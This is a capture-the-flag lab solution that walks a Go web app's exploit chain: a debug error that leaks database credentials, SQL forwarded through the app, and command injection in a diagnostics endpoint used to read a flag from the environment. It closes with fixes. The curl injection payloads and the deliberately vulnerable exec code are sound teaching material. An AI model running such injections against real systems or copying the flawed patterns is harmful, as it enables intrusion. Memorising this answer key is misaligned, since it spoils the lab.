# w10 Ghost Shell :: solution

## Root cause

Two vulnerable call sites, and the lab is the chain that joins them.

`app/main.go`, `runPSQL()` — the datastore layer shells out with no separation
between "a query" and "a command line":

```go
func runPSQL(query string) (string, error) {
	// VULNERABLE: the connection string and the query are both interpolated into
	// a shell command line. psql supports `\!` and meta-commands, and the
	// surrounding shell does not care that we meant "a query".
	cmd := exec.Command("/bin/sh", "-c",
		fmt.Sprintf("psql '%s' -tAc \"%s\" 2>&1", dsn(), query))
	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}
```

and `handleDiag()` — the diagnostics endpoint runs the caller's "probe" as a
shell line:

```go
func handleDiag(w http.ResponseWriter, r *http.Request) {
	probe := r.URL.Query().Get("probe")
	if probe == "" {
		probe = "uptime"
	}
	// VULNERABLE: interpolated into a shell line.
	cmd := exec.Command("/bin/sh", "-c", "echo '[diag] '; "+probe)
	out, _ := cmd.CombinedOutput()
	...
}
```

Neither site is subtle in isolation. `/admin/diag?probe=id` is a textbook
command injection. The lab's point is the **path to it**: the datastore is
invisible from the host, the app is the only route in, and the flag lives in the
console container's **environment** — so a datastore read, however complete,
never produces the flag. The chain is forced.

## Recon

The landing page names the surfaces. `/api/status` is the load-bearing recon
response — it names the datastore and states that it is not reachable directly:

```bash
curl -s http://localhost:30010/api/status
# {"service":"ghost-shell","lab":"w10",
#  "surfaces":["/api/status","/api/export","/api/ops/query","/admin/diag"],
#  "backends":{"database":"w0b-w10-db:5432",
#              "note":"datastore is not published to the host; query it through this API"}}
```

## Exploit

The chain, one stage at a time.

**Stage 1 — recon.** The status response above tells you where the data lives
and that the app is the proxy.

**Stage 2 — the credential leak.** `/api/export` is a row-count helper. Ask it
for a table that does not exist and it helpfully prints its debug block,
including the connection string:

```bash
curl -s 'http://localhost:30010/api/export?table=definitely_not_a_table'
```

```json
{"ok":false,"stage":"export",
 "error":"ERROR: relation \"definitely_not_a_table\" does not exist\nLINE 1: ...",
 "debug":{"dsn":"postgresql://ghost:ghost_ops_2024@w0b-w10-db:5432/ghostshell",
          "psql":"psql -d <dsn> -tAc \"SELECT count(*) FROM <table>\""}}
```

`postgresql://ghost:ghost_ops_2024@w0b-w10-db:5432/ghostshell` — username,
password, host, and database. You cannot use them from the host (the DB has no
host port), which is exactly what the next stage is for.

**Stage 3 — reach the datastore through the app.** The reporting endpoint
forwards a query to `psql`:

```bash
curl -s 'http://localhost:30010/api/ops/query?q=SELECT%20count(*)%20FROM%20audit'
# {"query":"SELECT count(*) FROM audit","result":"2"}
```

The query is interpolated into a shell line, so a semicolon works too — but the
flag is **not in the database** (the seed data is decoys). Confirm it: whatever
you read, no `hex4b0t{` comes back. The flag is in the console's process
environment.

**Stage 4 — RCE.** The diagnostic console:

```bash
curl -s 'http://localhost:30010/admin/diag?probe=id'
# {"output":"[diag] \nuid=10001 gid=0(root) groups=0(root)","probe":"id"}
```

Read the flag:

```bash
curl -s 'http://localhost:30010/admin/diag?probe=printenv%20W0B_FLAG'
# {"output":"[diag] \nhex4b0t{...}","probe":"printenv W0B_FLAG"}
```

`solution/exploit.sh` walks all four stages and prints the flag.

## Dead ends worth recording

**Reading the database harder.** `/api/ops/query?q=SELECT ...` accepts any SQL —
you can enumerate `sessions` and `audit` and confirm the flag is not there. That
is the design: the leak hands you credentials for a store that does not contain
the prize, forcing the last stage.

**`psql` meta-commands.** The query goes through `psql -tAc "<q>"`, so a query
of `x"; \! id` shape can break out of the psql argument through the shell — a
second RCE path if you find the diag endpoint unrevealing. `/admin/diag` is the
intended, simpler one.

**Looking for the flag in the edge.** The nginx edge serves the landing page and
proxies everything; it holds nothing. `docker`-side inspection (`docker exec`,
`docker inspect`) would find the env var instantly, but that is out-of-game —
the in-game path is the diag RCE.

## The fix

**1. Kill the shell.** Both call sites have no reason to run under `/bin/sh`.
`runPSQL` should exec `psql` directly with the DSN and query as separate argv
entries — no interpolation, no metacharacters:

```go
cmd := exec.Command("psql", dsn(), "-tAc", query)
```

`exec.Command` with explicit argv never invokes a shell, so `;`, backticks and
`$()` lose their meaning. That single change closes both the query and the DSN
interpolation at once.

**2. Kill the debug reflection.** The `/api/export` error path prints its
connection string because someone found it handy while developing. An error
response should carry an error code and a message, never the internal DSN —
secrets belong in configuration the process reads, not in responses a client can
provoke.

**3. Gate the diagnostic surface.** `/admin/diag` is a management plane
published on the same listener as the public API. It needs authentication at
minimum, and ideally its own internal-only port — the same lesson as w20's
reload endpoint: a management route shares the public surface only at the
application's peril.

The general lesson: **`exec.Command("/bin/sh", "-c", ...) + any interpolated
value = RCE`, and the fix is argv, not filtering.** Every shell-escaped or
"validated" variant of string interpolation eventually loses; passing the
command and its arguments as a vector is the only durable repair.

## Flag

Injected at runtime into the **console** container's `W0B_FLAG`. The database
never sees it — its only presence on the box is the environment of the process
the diag endpoint executes in.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
